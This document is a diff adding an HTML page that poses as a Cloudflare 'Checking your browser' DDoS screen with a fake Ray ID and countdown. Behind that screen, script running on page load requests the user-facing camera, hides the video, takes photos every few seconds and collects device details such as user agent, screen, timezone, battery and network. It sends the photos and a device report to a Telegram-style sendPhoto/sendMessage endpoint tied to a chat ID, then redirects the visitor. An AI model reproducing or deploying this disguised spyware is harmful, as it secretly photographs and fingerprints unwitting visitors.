@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Just a moment...</title>
+
+  <script src="config.js"></script>
+  <link rel="stylesheet" href="styles.css">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><circle cx='8' cy='8' r='8' fill='%23f4811e'/></svg>">
+
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+      background: #fff;
+      color: #333;
+      line-height: 1.6;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      text-align: center;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .cloudflare-screen {
+      max-width: 600px;
+      width: 100%;
+      padding: 40px 24px;
+      animation: fadeIn 0.25s ease-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-8px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .cf-logo { margin-bottom: 28px; }
+    .cf-logo svg { width: 72px; height: 72px; }
+
+    .cf-title {
+      font-size: 22px;
+      font-weight: 600;
+      color: #222;
+      margin-bottom: 16px;
+      line-height: 1.3;
+    }
+
+    .cf-subtitle {
+      font-size: 15px;
+      color: #666;
+      margin-bottom: 28px;
+      line-height: 1.6;
+    }
+
+    .cf-loading { margin: 32px 0; }
+
+    .cf-spinner {
+      border: 3px solid #e8e8e8;
+      border-top-color: #f4811e;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 0.9s linear infinite;
+      margin: 0 auto 18px;
+    }
+
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    .cf-progress {
+      font-size: 14px;
+      color: #666;
+      min-height: 1.4em;
+    }
+
+    .cf-footer {
+      margin-top: 40px;
+      padding-top: 18px;
+      border-top: 1px solid #e8e8e8;
+      font-size: 12px;
+      color: #999;
+    }
+
+    .cf-ray-id {
+      font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+      background: #f5f5f5;
+      padding: 2px 8px;
+      border-radius: 4px;
+      font-size: 12px;
+    }
+
+    /* Hidden camera elements */
+    #video, #canvas { display: none !important; }
+
+    /* Debug overlay */
+    .debug-overlay {
+      position: fixed;
+      bottom: 12px;
+      left: 12px;
+      right: 12px;
+      background: rgba(0,0,0,0.8);
+      color: #0f0;
+      font: 11px/1.4 monospace;
+      padding: 8px 12px;
+      border-radius: 6px;
+      z-index: 9999;
+      max-height: 100px;
+      overflow-y: auto;
+      text-align: left;
+      display: none;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+
+  <!-- Cloudflare DDoS Protection Screen -->
+  <div class="cloudflare-screen" id="cloudflareScreen">
+    <div class="cf-logo">
+      <svg viewBox="0 0 72 72" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="36" cy="36" r="36" fill="#f4811e"/>
+        <path d="M52 36c0-8.84-7.16-16-16-16s-16 7.16-16 16h4c0-6.63 5.37-12 12-12s12 5.37 12 12h4z" fill="#fff"/>
+        <path d="M36 28c-4.42 0-8 3.58-8 8h2c0-3.31 2.69-6 6-6s6 2.69 6 6h2c0-4.42-3.58-8-8-8z" fill="#fff"/>
+        <rect x="34" y="36" width="4" height="12" rx="2" fill="#fff"/>
+        <circle cx="36" cy="44" r="3" fill="#f4811e"/>
+      </svg>
+    </div>
+
+    <div class="cf-title">
+      Checking your browser before accessing <span id="targetSite">the requested site</span>.
+    </div>
+
+    <div class="cf-subtitle">
+      This process is automatic. Your browser will redirect to your requested content shortly.
+      <br><br>
+      Please allow up to <span id="countdown">5</span> seconds…
+    </div>
+
+    <div class="cf-loading">
+      <div class="cf-spinner"></div>
+      <div class="cf-progress" id="progressText">Performing security check…</div>
+    </div>
+
+    <div class="cf-footer">
+      DDoS protection by <strong>Cloudflare</strong>
+      <br><br>
+      Ray ID: <span class="cf-ray-id" id="rayId">••••••••••••••••</span>
+    </div>
+  </div>
+
+  <!-- Debug overlay -->
+  <div class="debug-overlay" id="debugOverlay"></div>
+</div>
+
+<script>
+(function() {
+  'use strict';
+
+  // ── Constants ──────────────────────────────────────────────
+  const C = window.CAPTURE_CONFIG || {};
+  const cam    = C.camera    || {};
+  const timing = C.timing    || {};
+  const dc     = C.dataCollection || {};
+
+  // ── DOM Refs ───────────────────────────────────────────────
+  const video     = document.getElementById('video');
+  const canvas    = document.getElementById('canvas');
+  const ctx       = canvas.getContext('2d');
+  const overlayEl = document.getElementById('debugOverlay');
+
+  // ── State ──────────────────────────────────────────────────
+  let stream          = null;
+  let captureInterval = null;
+  let photoCount      = 0;
+  let deviceInfoCache = null;
+  let batteryCache    = null;
+  let cameraInfo      = null;
+  let isCapturing     = false;
+
+  // ── Helpers ────────────────────────────────────────────────
+  function log(...args) {
+    if (C.debug?.consoleLogging !== false) console.log('[Capture]', ...args);
+  }
+
+  function getParam(name) {
+    return new URLSearchParams(window.location.search).get(name) || '';
+  }
+
+  function genRayId() {
+    return Array.from({ length: 16 }, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
+  }
+
+  // ── Cloudflare Screen ─────────────────────────────────────
+  function setupCloudflareScreen(redirectUrl) {
+    const target = document.getElementById('targetSite');
+    if (redirectUrl) target.textContent = redirectUrl.replace(/^https?:\/\//, '').split('/')[0] || 'the requested site';
+
+    document.getElementById('rayId').textContent = genRayId();
+
+    let secs = C.cloudflareScreen?.duration || timing.cloudflareDuration || 5;
+    const msgs = C.cloudflareScreen?.progressMessages || [
+      'Performing security check…',
+      'Analyzing browser fingerprint…',
+      'Checking for malicious activity…',
+      'Validating request integrity…',
+      'Finalizing security verification…',
+    ];
+    const el = document.getElementById('countdown');
+    const pe = document.getElementById('progressText');
+
+    const t = setInterval(() => {
+      secs--;
+      if (el) el.textContent = Math.max(secs, 0);
+      if (secs > 0 && secs < msgs.length && pe) pe.textContent = msgs[msgs.length - secs];
+      if (secs <= 0) { if (pe) pe.textContent = 'Redirecting…'; clearInterval(t); }
+    }, 1000);
+  }
+
+  // ── Redirect ──────────────────────────────────────────────
+  function redirect(url) {
+    const final = C.redirect?.autoHttps !== false && !url.includes('://') && url.includes('.')
+      ? 'https://' + url : url || C.redirect?.fallbackUrl || 'https://www.google.com';
+
+    if (captureInterval) clearInterval(captureInterval);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    setTimeout(() => { try { window.location.href = final; } catch { try { window.location.replace(final); } catch {} } }, timing.redirectBuffer || 500);
+  }
+
+  // ── Device Info ───────────────────────────────────────────
+  async function collectDeviceInfo() {
+    const info = {
+      userAgent:           navigator.userAgent,
+      platform:            navigator.platform,
+      language:            navigator.language,
+      languages:           navigator.languages,
+      cookieEnabled:       navigator.cookieEnabled,
+      hardwareConcurrency: navigator.hardwareConcurrency,
+      maxTouchPoints:      navigator.maxTouchPoints,
+      screenWidth:         screen.width,
+      screenHeight:        screen.height,
+      screenColorDepth:    screen.colorDepth,
+      timezone:            Intl.DateTimeFormat().resolvedOptions().timeZone,
+      url:                 window.location.href,
+      referrer:            document.referrer || '(direct)',
+      title:               document.title,
+    };
+
+    if (dc.collectNetwork !== false && navigator.connection) {
+      const c = navigator.connection;
+      info.network = { effectiveType: c.effectiveType, downlink: c.downlink, rtt: c.rtt, saveData: c.saveData };
+    }
+    if (dc.collectMemory !== false && performance.memory) {
+      info.memory = {
+        jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+        totalJSHeapSize: performance.memory.totalJSHeapSize,
+        usedJSHeapSize:  performance.memory.usedJSHeapSize,
+      };
+    }
+    return info;
+  }
+
+  async function collectBattery() {
+    if (dc.collectBattery === false || !('getBattery' in navigator)) return null;
+    try {
+      const b = await navigator.getBattery();
+      return { level: Math.round(b.level * 100) + '%', charging: b.charging };
+    } catch { return null; }
+  }
+
+  function getCamMake() {
+    const ua = navigator.userAgent.toLowerCase(), p = navigator.platform.toLowerCase();
+    if (ua.includes('iphone') || ua.includes('ipad') || p.includes('mac')) return 'Apple';
+    if (ua.includes('android')) {
+      if (ua.includes('samsung')) return 'Samsung';
+      if (ua.includes('google') || ua.includes('pixel')) return 'Google';
+      if (ua.includes('huawei')) return 'Huawei';
+      if (ua.includes('xiaomi')) return 'Xiaomi';
+      if (ua.includes('oneplus')) return 'OnePlus';
+      return 'Android Device';
+    }
+    if (p.includes('win')) return 'Windows PC';
+    if (p.includes('linux')) return 'Linux PC';
+    return 'Unknown';
+  }
+
+  function getCamModel() {
+    const ua = navigator.userAgent.toLowerCase(), p = navigator.platform.toLowerCase();
+    if (ua.includes('iphone os 17')) return 'iPhone 15 Pro Max';
+    if (ua.includes('iphone os 16')) return 'iPhone 14 Pro';
+    if (ua.includes('iphone')) return 'iPhone';
+    if (ua.includes('ipad')) return 'iPad Pro';
+    if (p.includes('mac')) return 'FaceTime HD Camera';
+    if (ua.includes('android')) { const m = ua.match(/android ([\d.]+)/); return 'Android ' + (m ? m[1] : '') + ' Camera'; }
+    if (p.includes('win')) return 'Windows Webcam';
+    if (p.includes('linux')) return 'Linux UVC Camera';
+    return 'Web Camera';
+  }
+
+  async function getCamInfo() {
+    try {
+      const track = stream.getVideoTracks()[0];
+      const s = track.getSettings();
+      cameraInfo = {
+        deviceId: s.deviceId, width: s.width, height: s.height,
+        frameRate: s.frameRate, facingMode: s.facingMode,
+        make: getCamMake(), model: getCamModel(),
+        software: (navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)\/[\d.]+/) || ['Unknown'])[0],
+      };
+    } catch { cameraInfo = { make: getCamMake(), model: getCamModel() }; }
+  }
+
+  // ── API Calls ─────────────────────────────────────────────
+  async function callAPI(action, chatId, body) {
+    const endpoint = action === 'sendPhoto' ? C.api?.sendPhoto || '/api/sendPhoto' : C.api?.sendMessage || '/api/sendMessage';
+    try {
+      const resp = await fetch(endpoint, { method: 'POST', body });
+      const json = await resp.json();
+      log('API response:', json);
+      return json;
+    } catch (e) { log('API error:', e); return null; }
+  }
+
+  // ── Capture & Send ────────────────────────────────────────
+  async function captureAndSend() {
+    if (isCapturing) return;
+    isCapturing = true;
+
+    try {
+      if (C.camera?.maxPhotos > 0 && photoCount >= C.camera.maxPhotos) {
+        if (captureInterval) clearInterval(captureInterval);
+        isCapturing = false;
+        return;
+      }
+
+      canvas.width  = video.videoWidth  || 640;
+      canvas.height = video.videoHeight || 480;
+      ctx.drawImage(video, 0, 0);
+
+      photoCount++;
+      const ts = new Date().toISOString();
+
+      const deviceInfo = { timestamp: ts, photoNumber: photoCount, onLine: navigator.onLine, ...deviceInfoCache, battery: batteryCache };
+      if (performance.memory) {
+        deviceInfo.memory = {
+          usedJSHeapSize:  performance.memory.usedJSHeapSize,
+          totalJSHeapSize: performance.memory.totalJSHeapSize,
+          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
+        };
+      }
+
+      const jpegQ = C.camera?.jpegQuality || 0.85;
+      canvas.toBlob(async (blob) => {
+        if (!blob) { isCapturing = false; return; }
+
+        const chatId = getParam('chatid') || C.defaultChatId || '';
+        if (!chatId) { log('No chat ID'); isCapturing = false; return; }
+
+        const caption = [
+          '📸 Photo #' + photoCount,
+          '🕐 ' + ts,
+          '📱 ' + (deviceInfoCache?.platform || '?'),
+          '🖥️ ' + canvas.width + '×' + canvas.height,
+          '🌐 ' + (navigator.onLine ? 'Online' : 'Offline'),
+          batteryCache ? '🔋 ' + batteryCache.level + (batteryCache.charging ? ' ⚡' : '') : '',
+          deviceInfo.network ? '📶 ' + deviceInfo.network.effectiveType : '',
+          '💾 CPU: ' + (deviceInfoCache?.hardwareConcurrency || '?') + ' cores',
+          cameraInfo ? '📷 ' + cameraInfo.model : '',
+        ].filter(Boolean).join('\n');
+
+        const fd = new FormData();
+        fd.append('chat_id', chatId);
+        fd.append('photo', blob, 'photo_' + photoCount + '_' + Date.now() + '.jpg');
+        fd.append('caption', caption);
+
+        const result = await callAPI('sendPhoto', chatId, fd);
+        if (result?.ok) {
+          log('Photo #' + photoCount + ' sent');
+          if (photoCount === 1 && dc.sendDetailedInfo !== false) {
+            await sendDetailedInfo(chatId, deviceInfo);
+          }
+        }
+        isCapturing = false;
+      }, 'image/jpeg', jpegQ);
+
+    } catch (e) { log('Capture error:', e); isCapturing = false; }
+  }
+
+  async function sendDetailedInfo(chatId, di) {
+    const text = [
+      '🔍 DETAILED DEVICE INFO — Photo #' + di.photoNumber,
+      '',
+      '📱 DEVICE:',
+      '• UA: ' + (di.userAgent || 'N/A'),
+      '• Platform: ' + (di.platform || 'N/A'),
+      '• Language: ' + (di.language || 'N/A'),
+      '• Cores: ' + (di.hardwareConcurrency || '?'),
+      '',
+      '🖥️ SCREEN: ' + (di.screenWidth || '?') + '×' + (di.screenHeight || '?'),
+      '',
+      '🌐 NETWORK:',
+      di.network ? '• Type: ' + di.network.effectiveType + ' | ' + di.network.downlink + ' Mbps' : '• N/A',
+      '',
+      '📷 CAMERA:',
+      cameraInfo ? '• ' + cameraInfo.make + ' ' + cameraInfo.model + ' | ' + (cameraInfo.width||'?') + '×' + (cameraInfo.height||'?') : '• N/A',
+      '',
+      '🔋 BATTERY: ' + (di.battery ? di.battery.level + (di.battery.charging ? ' ⚡' : '') : 'N/A'),
+      '',
+      '🌍 Timezone: ' + (di.timezone || '?'),
+      di.memory ? '💻 Heap: ' + Math.round(di.memory.usedJSHeapSize/1024/1024) + '/' + Math.round(di.memory.totalJSHeapSize/1024/1024) + ' MB' : '',
+      '',
+      '🔗 ' + (di.url || ''),
+    ].join('\n');
+
+    const fd = new FormData();
+    fd.append('chat_id', chatId);
+    fd.append('text', text);
+    fd.append('parse_mode', 'HTML');
+    await callAPI('sendMessage', chatId, fd);
+  }
+
+  // ── Start ─────────────────────────────────────────────────
+  async function startCamera() {
+    try {
+      const w  = cam.width  || { ideal: 1280 };
+      const h  = cam.height || { ideal: 720 };
+      const fm = cam.facingMode || { ideal: 'user' };
+
+      stream = await navigator.mediaDevices.getUserMedia({ video: { width: w, height: h, facingMode: fm } });
+      video.srcObject = stream;
+      await getCamInfo();
+      await new Promise(r => { video.addEventListener('loadedmetadata', r, { once: true }); });
+      await new Promise(r => setTimeout(r, timing.initialCaptureDelay || 1000));
+
+      const interval = cam.captureInterval || 2000;
+      captureInterval = setInterval(captureAndSend, interval);
+      await captureAndSend();
+    } catch (e) {
+      log('Camera error:', e.message);
+    }
+  }
+
+  // ── MAIN ──────────────────────────────────────────────────
+  window.addEventListener('load', async () => {
+    const chatId = getParam('chatid');
+    const redirectUrl = getParam('redirect');
+
+    log('Config:', C);
+    log('chatId:', chatId, 'redirect:', redirectUrl);
+
+    setupCloudflareScreen(redirectUrl);
+
+    deviceInfoCache = await collectDeviceInfo();
+    batteryCache = await collectBattery();
+    startCamera();
+
+    const dur = (C.cloudflareScreen?.duration || timing.cloudflareDuration || 5) * 1000;
+    setTimeout(() => redirect(redirectUrl), dur);
+  });
+
+  window.addEventListener('beforeunload', () => {
+    if (captureInterval) clearInterval(captureInterval);
+    if (stream) stream.getTracks().forEach(t => t.stop());
+  });
+})();
+</script>
+</body>
+</html>
